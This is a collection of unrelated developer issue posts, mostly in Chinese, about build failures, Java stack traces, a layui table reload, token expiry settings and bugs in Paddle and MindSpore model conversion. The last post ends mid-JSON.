单页版gulp构建后，无法生成dist文件夹,gulp成功后，没有dist文件夹   <code>: gulp -v CLI version: 2.3.0 Local version: 3.9.1 node -v v11.15.0 PS J:\webroot\shuilang\admin-frontend - 副本 (3)&gt; gulp [12:50:01] Using gulpfile J:\gulpfile.js [12:50:01] Starting 'clear'... [12:50:01] Starting 'clearSrc'... [12:50:01] Finished 'clear' after 10 ms [12:50:02] Finished 'clearSrc' after 79 ms [12:50:02] Starting 'src'... [12:50:02] Finished 'src' after 15 ms [12:50:02] Starting 'default'... [12:50:02] Finished 'default' after 9.35 ms
Knife4j 2.0.7,访问doc.html报如下的错误；我用的springboot版本2.2.13   <code>: 2022-02-12 12:13:01.351 INFO 58126 --- [nio-8088-exec-7] com.jeesharp.config.web.LogInterceptor : 当前拦截的方法为：springfox.documentation.swagger.web.ApiResourceController 2022-02-12 12:13:24.775 ERROR 58126 --- [nio-8088-exec-9] o.a.r.exception.ExceptionHandlerAdvice : Unhandled exception org.apache.catalina.connector.ClientAbortException: java.io.IOException: Protocol wrong type for socket at org.apache.catalina.connector.OutputBuffer.realWriteBytes(OutputBuffer.java:351) at org.apache.catalina.connector.OutputBuffer.flushByteBuffer(OutputBuffer.java:776) at org.apache.catalina.connector.OutputBuffer.append(OutputBuffer.java:681) at org.apache.catalina.connector.OutputBuffer.writeBytes(OutputBuffer.java:386) at org.apache.catalina.connector.OutputBuffer.write(OutputBuffer.java:364) at org.apache.catalina.connector.CoyoteOutputStream.write(CoyoteOutputStream.java:96) at org.springframework.util.StreamUtils$NonClosingOutputStream.write(StreamUtils.java:287) at com.fasterxml.jackson.core.json.UTF8JsonGenerator._flushBuffer(UTF8JsonGenerator.java:2137) at com.fasterxml.jackson.core.json.UTF8JsonGenerator.writeRaw(UTF8JsonGenerator.java:680) at com.fasterxml.jackson.core.json.UTF8JsonGenerator.writeRaw(UTF8JsonGenerator.java:652) at com.fasterxml.jackson.core.base.GeneratorBase.writeRawValue(GeneratorBase.java:327) at com.fasterxml.jackson.databind.ser.std.RawSerializer.serialize(RawSerializer.java:31) at com.fasterxml.jackson.databind.ser.std.JsonValueSerializer.serialize(JsonValueSerializer.java:181) at com.fasterxml.jackson.databind.ser.DefaultSerializerProvider._serialize(DefaultSerializerProvider.java:480) at com.fasterxml.jackson.databind.ser.DefaultSerializerProvider.serializeValue(DefaultSerializerProvider.java:319) at com.fasterxml.jackson.databind.ObjectWriter$Prefetch.serialize(ObjectWriter.java:1396) at com.fasterxml.jackson.databind.ObjectWriter.writeValue(ObjectWriter.java:913) at org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.writeInternal(AbstractJackson2HttpMessageConverter.java:346) at org.springframework.http.converter.AbstractGenericHttpMessageConverter.write(AbstractGenericHttpMessageConverter.java:104) at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor.writeWithMessageConverters(AbstractMessageConverterMethodProcessor.java:277) at org.springframework.web.servlet.mvc.method.annotation.HttpEntityMethodProcessor.handleReturnValue(HttpEntityMethodProcessor.java:219) at org.springframework.web.method.support.HandlerMethodReturnValueHandlerComposite.handleReturnValue(HandlerMethodReturnValueHandlerComposite.java:82) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:123) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) at javax.servlet.http.HttpServlet.service(HttpServlet.java:626) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:112) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.jeesharp.modules.poster.filter.OriginFilter.doFilter(OriginFilter.java:31) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:124) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:450) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:109) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.__invoke(StandardContextValve.java:97) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:41002) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:888) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1597) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) Caused by: java.io.IOException: Protocol wrong type for socket at sun.nio.ch.FileDispatcherImpl.write0(Native Method) at sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:47) at sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:93) at sun.nio.ch.IOUtil.write(IOUtil.java:65) at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:471) at org.apache.tomcat.util.net.NioChannel.write(NioChannel.java:138) at org.apache.tomcat.util.net.NioBlockingSelector.write(NioBlockingSelector.java:101) at org.apache.tomcat.util.net.NioSelectorPool.write(NioSelectorPool.java:152) at org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper.doWrite(NioEndpoint.java:1253) at org.apache.tomcat.util.net.SocketWrapperBase.doWrite(SocketWrapperBase.java:764) at org.apache.tomcat.util.net.SocketWrapperBase.writeBlocking(SocketWrapperBase.java:584) at org.apache.tomcat.util.net.SocketWrapperBase.write(SocketWrapperBase.java:528) at org.apache.coyote.http11.Http11OutputBuffer$SocketOutputBuffer.doWrite(Http11OutputBuffer.java:546) at org.apache.coyote.http11.filters.ChunkedOutputFilter.doWrite(ChunkedOutputFilter.java:112) at org.apache.coyote.http11.Http11OutputBuffer.doWrite(Http11OutputBuffer.java:193) at org.apache.coyote.Response.doWrite(Response.java:601) at org.apache.catalina.connector.OutputBuffer.realWriteBytes(OutputBuffer.java:339) ... 117 common frames omitted 2022-02-12 12:13:24.777 WARN 58126 --- [nio-8088-exec-9] .m.m.a.ExceptionHandlerExceptionResolver : Failure in @ExceptionHandler org.activiti.rest.exception.ExceptionHandlerAdvice#handleOtherException(Exception) org.apache.catalina.connector.ClientAbortException: java.io.IOException: Broken pipe at org.apache.catalina.connector.OutputBuffer.realWriteBytes(OutputBuffer.java:351) at org.apache.catalina.connector.OutputBuffer.flushByteBuffer(OutputBuffer.java:776) at org.apache.catalina.connector.OutputBuffer.append(OutputBuffer.java:681) at org.apache.catalina.connector.OutputBuffer.writeBytes(OutputBuffer.java:386) at org.apache.catalina.connector.OutputBuffer.write(OutputBuffer.java:364) at org.apache.catalina.connector.CoyoteOutputStream.write(CoyoteOutputStream.java:96) at org.springframework.util.StreamUtils$NonClosingOutputStream.write(StreamUtils.java:287) at com.fasterxml.jackson.core.json.UTF8JsonGenerator._flushBuffer(UTF8JsonGenerator.java:2137) at com.fasterxml.jackson.core.json.UTF8JsonGenerator.flush(UTF8JsonGenerator.java:1150) at com.fasterxml.jackson.databind.ObjectWriter.writeValue(ObjectWriter.java:915) at org.springframework.http.converter.json.AbstractJackson2HttpMessageConverter.writeInternal(AbstractJackson2HttpMessageConverter.java:346) at org.springframework.http.converter.AbstractGenericHttpMessageConverter.write(AbstractGenericHttpMessageConverter.java:104) at org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor.writeWithMessageConverters(AbstractMessageConverterMethodProcessor.java:277) at org.springframework.web.servlet.mvc.method.annotation.RequestResponseBodyMethodProcessor.handleReturnValue(RequestResponseBodyMethodProcessor.java:181) at org.springframework.web.method.support.HandlerMethodReturnValueHandlerComposite.handleReturnValue(HandlerMethodReturnValueHandlerComposite.java:82) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:123) at org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver.doResolveHandlerMethodException(ExceptionHandlerExceptionResolver.java:403) at org.springframework.web.servlet.handler.AbstractHandlerMethodExceptionResolver.doResolveException(AbstractHandlerMethodExceptionResolver.java:61) at org.springframework.web.servlet.handler.AbstractHandlerExceptionResolver.resolveException(AbstractHandlerExceptionResolver.java:141) at org.springframework.web.servlet.handler.HandlerExceptionResolverComposite.resolveException(HandlerExceptionResolverComposite.java:80) at org.springframework.web.servlet.DispatcherServlet.processHandlerException(DispatcherServlet.java:1300) at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1111) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1057) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) at javax.servlet.http.HttpServlet.service(HttpServlet.java:626) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:112) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.jeesharp.modules.poster.filter.OriginFilter.doFilter(OriginFilter.java:31) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:124) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:450) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:109) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.__invoke(StandardContextValve.java:97) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:41002) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:888) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1597) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) Caused by: java.io.IOException: Broken pipe at sun.nio.ch.FileDispatcherImpl.write0(Native Method) at sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:47) at sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:93) at sun.nio.ch.IOUtil.write(IOUtil.java:65) at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:471) at org.apache.tomcat.util.net.NioChannel.write(NioChannel.java:138) at org.apache.tomcat.util.net.NioBlockingSelector.write(NioBlockingSelector.java:101) at org.apache.tomcat.util.net.NioSelectorPool.write(NioSelectorPool.java:152) at org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper.doWrite(NioEndpoint.java:1253) at org.apache.tomcat.util.net.SocketWrapperBase.doWrite(SocketWrapperBase.java:764) at org.apache.tomcat.util.net.SocketWrapperBase.writeBlocking(SocketWrapperBase.java:584) at org.apache.tomcat.util.net.SocketWrapperBase.write(SocketWrapperBase.java:528) at org.apache.coyote.http11.Http11OutputBuffer$SocketOutputBuffer.doWrite(Http11OutputBuffer.java:546) at org.apache.coyote.http11.filters.ChunkedOutputFilter.doWrite(ChunkedOutputFilter.java:110) at org.apache.coyote.http11.Http11OutputBuffer.doWrite(Http11OutputBuffer.java:193) at org.apache.coyote.Response.doWrite(Response.java:601) at org.apache.catalina.connector.OutputBuffer.realWriteBytes(OutputBuffer.java:339) ... 113 common frames omitted
无法重载是什么原因？table.reload点了没反映,"代码如下：点击搜索，没反映，但alert();能获取到搜索的值，table.reload（）没成功，有谁遇到过吗？ var jsonstr=""""; getinbox(); //处理了拼接了jsonstr, layui.use('table', function(){ var table = layui.table; //方法级渲染 table.render({ elem: '#LAY_table_user' ,data:jsonstr ,initSort: {field:'send_time', type:'desc'} ,cols: [ [ {checkbox: true, fixed: true} ,{field:'isread', title: '状态', width:80, sort: true} ,{field:'email_no', title: '邮箱 ', width:180,sort: true,templet: function(res){ return '<em>'+ res.email_no +'</em>' }} ,{field:'title', title: '主题', width:400} ,{field:'senduser', title: '发件人', sort: true, width:100} ,{field:'send_time', title: '发件时间', width:180} ,{field:'has_att', title: '附件', width:80} ] ] ,id: 'testReload' ,page: true ,limit:50 ,height: 810 });   <code>: var $ = layui.$, active = { reload: function(){ var demoReload = $('#demoReload'); **alert(demoReload.val()); //此处可以运行成功** //执行重载 table.reload('testReload', { page: { curr: 1 //重新从第 1 页开始 } ,where: { key: { title:demoReload.val() } } }); } }; $('.demoTable .layui-btn').on('click', function(){ var type = $(this).data('type'); active[type] ? active[type].call(this) : ''; }); //监听行单击事件（双击事件为：rowDouble） });"
org.ibase4j.core.config.Resources 类上的注解@PropertySource可以删除吧,"类如下： 类上的注解PropertySource 可以删除吧   <code>: @PropertySource(value = {""classpath:config/thirdParty.properties"", ""classpath:i18n/messages*.properties""}) public final class Resources { …………………… }"
多端登录token有效期,目前系统内有后台和移动端，后台是常规的30分钟无操作就token过期，于是我配置了，但是我手机端可能需要token临时有效期比较长，请问如何配置？   <code>: activity-timeout: 1800
Code style of the gru_op related should be formatted,"The code style of the gru_op related, mainly the variable names like , should be formatted and unified with other code.   <code>: batchSize"
仿照场景文字识别例子做车牌识别，保存的参数是错的,"因为车牌是有中文的，所以label和标签字典都是有中文的，label有中文，使用模型预测是就报错，日志如下：   <code>: Traceback (most recent call last): File ""infer.py"", line 64, in &lt;module&gt; result = infer(img_path, model_path, image_shape, label_dict_path) File ""infer.py"", line 40, in infer parameters = paddle.parameters.Parameters.from_tar(gzip.open(model_path)) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/parameters.py"", line 292, in from_tar for finfo in tar: File ""/usr/lib/python2.7/tarfile.py"", line 2508, in next tarinfo = self.tarfile.next() File ""/usr/lib/python2.7/tarfile.py"", line 2348, in next self.fileobj.seek(self.offset - 1) File ""/usr/lib/python2.7/gzip.py"", line 443, in seek self.read(1024) File ""/usr/lib/python2.7/gzip.py"", line 268, in read self._read(readsize) File ""/usr/lib/python2.7/gzip.py"", line 315, in _read self._read_eof() File ""/usr/lib/python2.7/gzip.py"", line 354, in _read_eof hex(self.crc))) IOError: CRC check failed 0x627501ed != 0xd6a0572L"
如何使用token 访问后台接口,"pigx版本: 2.5.1 操作系统:win7 是否修改包名: 有 访问 http://localhost:8080/admin/user/info 如何进行访问，才正常？   <code>: { code: 1, msg: ""Full authentication is required to access this resource"", data: ""Full authentication is required to access this resource"" }"
Se-Renext model memory saving when the in-place activation is toggled,"se_renext model, use 50 layer in this test, scripts https://github.com/dzhwinter/benchmark/tree/master/fluid/SE-ResNeXt-152 The in-place activation save memory from 9397 MiB to 7835 MiB. in-place activation is used in-place activation is not used   <code>: 50082, python, 7807 MiB 50082, python, 7835 MiB 50082, python, 7835 MiB 50082, python, 7835 MiB 50082, python, 7835 MiB 45094, python, 9259 MiB 45094, python, 9285 MiB 45094, python, 9285 MiB 45094, python, 9385 MiB 45094, python, 9389 MiB 45094, python, 9397 MiB"
deconv算子 tflite根据schema生成ms 解析的参数有问题,"deconv算子 tflite生成ms 解析的参数有问题 bug : /device cpu : -- MindSpore version : v1.0.0 -- Python version : 3.5 -- OS platform and distribution : CentOS 7 -- GCC/Compiler version : 7.3.0 mindspore/lite/test/ut/tools/converter/parser/tflite/test_data/deconv.tflite tflite生成ms ms生成json <ol start=""3""> 生成的json文件有两个问题 hasBias: true 但是实际只有两个输入tensor weight tensor 维度为{1, 3, 3, 4} (应该为 {4, 3, 3, 1}).   <code>: converter_lite --fmk=TFLITE --modelFile=deconv.tflite --outputFile=deconv ./flatc --json --strict-json --defaults-json --unknown-json ./schema/model.fbs --raw-binary -- deconv.ms { ""version"": ""MindSpore Lite 1.0.0"", ""fmkType"": 0, ""inputIndex"": [ 0 ], ""outputIndex"": [ 2 ], ""mempoolSize"": 0, ""nodes"": [ { ""name"": ""DeConv2D-0"", ""nodeType"": ""CNode"", ""primitive"": { ""value_type"": ""DeConv2D"", ""value"": { ""format"": ""NHWC"", ""group"": 1, ""channelIn"": 1, ""channelOut"": 4, ""kernelW"": 3, ""kernelH"": 3, ""strideW"": 1, ""strideH"": 1, ""padMode"": ""SAME_UPPER"", ""padUp"": 1, ""padDown"": 1, ""padLeft"": 1, ""padRight"": 1, ""dilateW"": 1, ""dilateH"": 1, ""hasBias"": true, ""activationType"": ""NO_ACTIVATION"" } }, ""inputIndex"": [ 0, 1 ], ""outputIndex"": [ 2 ], ""quantType"": ""QUANT_NONE"" } ], ""allTensors"": 